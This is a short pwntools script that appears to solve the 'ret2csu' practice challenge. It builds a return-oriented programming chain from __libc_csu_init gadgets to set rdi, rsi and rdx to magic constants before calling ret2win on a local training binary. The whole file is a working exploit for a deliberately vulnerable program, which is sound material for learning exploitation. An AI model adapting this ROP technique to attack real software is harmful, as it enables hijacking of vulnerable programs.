from pwn import *

r = process("./ret2csu")
payload = b""
# gdb.attach(r, api=True)

payload += b"a"*40 #padding
payload += p64(0x40069a) #gadget2
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(0x600e48) # point to fini_funct
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(0xd00df00dd00df00d) # r15
payload += p64(0x400680) # gadget1
payload += p64(0) * 7 # 6 + 1 for bypass:  add rsp,0x8
payload += p64(0x4006a3) # pop rdi ; ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x4006a1) #  pop rsi ; pop r15 ; ret
payload += p64(0xcafebabecafebabe)  # rsi
payload += p64(0) # r15
payload += p64(0x4004e6) # ret
payload += p64(0x400510) # ret2win
r.sendline(payload)

r.interactive()

